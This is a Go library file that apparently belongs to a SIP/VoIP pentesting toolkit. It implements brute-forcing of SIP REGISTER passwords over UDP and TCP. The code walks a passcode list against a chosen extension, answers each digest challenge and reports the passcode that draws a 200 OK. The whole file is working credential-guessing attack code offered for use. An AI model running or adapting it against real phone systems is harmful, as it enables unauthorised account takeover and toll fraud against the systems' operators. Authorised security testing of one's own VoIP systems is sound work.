package siplib

import "time"
import "errors"

// High-level function to do a REGISTER bruteforce over UDP.

func BruteforceRegisterUDP(target string, port int, timeout int, throttle int, extension string, passcodes []string) (string, error) {
	for _,passcode := range passcodes {
		res,err := RegisterLoginUDP(target, port, timeout, extension, passcode)
		if err != nil {
			return "",err
		}
		if res {
			return passcode,nil
		}
		time.Sleep(time.Duration(throttle) * time.Millisecond)
	}
	return "",nil
}

func RegisterLoginUDP(target string, port int, timeout int, extension string, passcode string) (bool,error) {
	//perform initial check and get authentication info
	res,err := RegisterCheckUDP(target, port, timeout, extension)
	if err != nil {
		return false,err
	}
	auth,err := GetAuthInfo(res)
	if err != nil {
		return false,err
	}
	auth.SetCreds(extension, passcode)
	call_id := res.Headers["Call-ID"]
	//connect to server
	conn,err := ConnectUDP(target, port)
	if err != nil {
		return false,err
	}
	defer conn.Close()
	//generate the request
	req := SIPRequest{}
	req.Init("UDP", target, "REGISTER", "")
	req.DefaultHeaders()
	req.SetContactHeaders("1.1.1.1", 5060) 
	recipient_uri := GenerateURI(target, auth.User)
	req.SetRecipients(auth.User, recipient_uri, auth.User, recipient_uri)
	auth_uri := GenerateURI(target, "")
	req.Headers["Authorization"],err = auth.Generate(auth_uri, "REGISTER")
	req.Headers["Cseq"] = "2 REGISTER"
	req.Headers["Call-ID"] = call_id
	if err != nil {
		return false,err
	}
	//make the request
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	conn.SetDeadline(deadline)
	err = SendUDP(conn, req)
	if err != nil {
		return false,err
	}
	//receive and parse responses until we get a 401 or time out
	for {
		resp,err := RecvUDP(conn)
		if err != nil {
			return false,err
		}
		parsed,err := ParseResponse(resp)
		if val,ok := parsed.Headers["Call-ID"]; ok && (err == nil) {
			//check if an ACK is needed
			if (parsed.StatusCode >= 200) && (parsed.StatusCode < 699) {
				ack := req
				ack.Method = "ACK"
				ack.URI = GenerateURI(ack.Host, "")
				ack.Headers["Cseq"] = "1 ACK"
				SendUDP(conn, ack)
			}
			//check if a BYE is needed
			if (parsed.StatusCode == 200) {
				bye := req
				bye.Method = "BYE"
				bye.URI = GenerateURI(bye.Host, "")
				bye.Headers["Cseq"] = "2 BYE"
				SendUDP(conn, bye)
			}
			if (val == call_id) {
				switch parsed.StatusCode {
					case 401:
						return false,nil
					case 403:
						return false,nil
					case 200:
						return true,nil
					default:
						return false,errors.New("Unrecognised status code during authentication attempt: " + parsed.Status)
				}
			}
		}
	}
}

func RegisterCheckUDP(target string, port int, timeout int, extension string) (SIPResponse,error) {
	//connect to server
	conn,err := ConnectUDP(target, port)
	if err != nil {
		return SIPResponse{},err
	}
	defer conn.Close()
	//generate the request
	req := SIPRequest{}
	req.Init("UDP", target, "REGISTER", "")
	req.DefaultHeaders()
	req.SetContactHeaders("1.1.1.1", 5060) 
	recipient_uri := GenerateURI(target, extension)
	req.SetRecipients(extension, recipient_uri, extension, recipient_uri)
	//make the request
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	conn.SetDeadline(deadline)
	err = SendUDP(conn, req)
	if err != nil {
		return SIPResponse{},err
	}
	//receive and parse responses until we get a 401 or time out
	call_id := req.Headers["Call-ID"]
	for {
		resp,err := RecvUDP(conn)
		if err != nil {
			return SIPResponse{},err
		}
		parsed,err := ParseResponse(resp)
		if val,ok := parsed.Headers["Call-ID"]; ok && (err == nil) {
			//check if an ACK is needed
			if (parsed.StatusCode >= 200) && (parsed.StatusCode < 699) {
				ack := req
				ack.Method = "ACK"
				ack.URI = GenerateURI(ack.Host, "")
				ack.Headers["Cseq"] = "1 ACK"
				SendUDP(conn, ack)
			}
			//check if a BYE is needed
			if (parsed.StatusCode == 200) {
				bye := req
				bye.Method = "BYE"
				bye.URI = GenerateURI(bye.Host, "")
				bye.Headers["Cseq"] = "2 BYE"
				SendUDP(conn, bye)
			}
			if (val == call_id) {
				if parsed.StatusCode == 401 {
					//return the SIPResponse
					return parsed,nil
				} else {
					//???
					return parsed,errors.New("Unrecognised status code during initial check: " + parsed.Status)
				}
			}
		}
	}
}

// High-level function to do a REGISTER bruteforce over TCP.

func BruteforceRegisterTCP(target string, port int, timeout int, throttle int, extension string, passcodes []string) (string, error) {
	for _,passcode := range passcodes {
		res,err := RegisterLoginTCP(target, port, timeout, extension, passcode)
		if err != nil {
			return "",err
		}
		if res {
			return passcode,nil
		}
		time.Sleep(time.Duration(throttle) * time.Millisecond)
	}
	return "",nil
}

func RegisterLoginTCP(target string, port int, timeout int, extension string, passcode string) (bool,error) {
	//perform initial check and get authentication info
	res,err := RegisterCheckTCP(target, port, timeout, extension)
	if err != nil {
		return false,err
	}
	auth,err := GetAuthInfo(res)
	if err != nil {
		return false,err
	}
	auth.SetCreds(extension, passcode)
	call_id := res.Headers["Call-ID"]
	//connect to server
	conn,err := ConnectTCP(target, port)
	if err != nil {
		return false,err
	}
	defer conn.Close()
	//generate the request
	req := SIPRequest{}
	req.Init("TCP", target, "REGISTER", "")
	req.DefaultHeaders()
	req.SetContactHeaders("1.1.1.1", 5060) 
	recipient_uri := GenerateURI(target, auth.User)
	req.SetRecipients(auth.User, recipient_uri, auth.User, recipient_uri)
	auth_uri := GenerateURI(target, "")
	req.Headers["Authorization"],err = auth.Generate(auth_uri, "REGISTER")
	req.Headers["Cseq"] = "2 REGISTER"
	req.Headers["Call-ID"] = call_id
	if err != nil {
		return false,err
	}
	//make the request
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	conn.SetDeadline(deadline)
	err = SendTCP(conn, req)
	if err != nil {
		return false,err
	}
	//receive and parse responses until we get a 401 or time out
	for {
		resp,err := RecvTCP(conn)
		if err != nil {
			return false,err
		}
		parsed,err := ParseResponse(resp)
		if val,ok := parsed.Headers["Call-ID"]; ok && (err == nil) {
			//check if an ACK is needed
			if (parsed.StatusCode >= 200) && (parsed.StatusCode < 699) {
				ack := req
				ack.Method = "ACK"
				ack.URI = GenerateURI(ack.Host, "")
				ack.Headers["Cseq"] = "1 ACK"
				SendTCP(conn, ack)
			}
			//check if a BYE is needed
			if (parsed.StatusCode == 200) {
				bye := req
				bye.Method = "BYE"
				bye.URI = GenerateURI(bye.Host, "")
				bye.Headers["Cseq"] = "2 BYE"
				SendTCP(conn, bye)
			}
			if (val == call_id) {
				switch parsed.StatusCode {
					case 401:
						return false,nil
					case 403:
						return false,nil
					case 200:
						return true,nil
					default:
						return false,errors.New("Unrecognised status code during authentication attempt: " + parsed.Status)
				}
			}
		}
	}
}

func RegisterCheckTCP(target string, port int, timeout int, extension string) (SIPResponse,error) {
	//connect to server
	conn,err := ConnectTCP(target, port)
	if err != nil {
		return SIPResponse{},err
	}
	defer conn.Close()
	//generate the request
	req := SIPRequest{}
	req.Init("TCP", target, "REGISTER", "")
	req.DefaultHeaders()
	req.SetContactHeaders("1.1.1.1", 5060) 
	recipient_uri := GenerateURI(target, extension)
	req.SetRecipients(extension, recipient_uri, extension, recipient_uri)
	//make the request
	deadline := time.Now().Add(time.Duration(timeout) * time.Second)
	conn.SetDeadline(deadline)
	err = SendTCP(conn, req)
	if err != nil {
		return SIPResponse{},err
	}
	//receive and parse responses until we get a 401 or time out
	call_id := req.Headers["Call-ID"]
	for {
		resp,err := RecvTCP(conn)
		if err != nil {
			return SIPResponse{},err
		}
		parsed,err := ParseResponse(resp)
		if val,ok := parsed.Headers["Call-ID"]; ok && (err == nil) {
			//check if an ACK is needed
			if (parsed.StatusCode >= 200) && (parsed.StatusCode < 699) {
				ack := req
				ack.Method = "ACK"
				ack.URI = GenerateURI(ack.Host, "")
				ack.Headers["Cseq"] = "1 ACK"
				SendTCP(conn, ack)
			}
			//check if a BYE is needed
			if (parsed.StatusCode == 200) {
				bye := req
				bye.Method = "BYE"
				bye.URI = GenerateURI(bye.Host, "")
				bye.Headers["Cseq"] = "2 BYE"
				SendTCP(conn, bye)
			}
			if (val == call_id) {
				if parsed.StatusCode == 401 {
					//return the SIPResponse
					return parsed,nil
				} else {
					//???
					return parsed,errors.New("Unrecognised status code during initial check: " + parsed.Status)
				}
			}
		}
	}
}
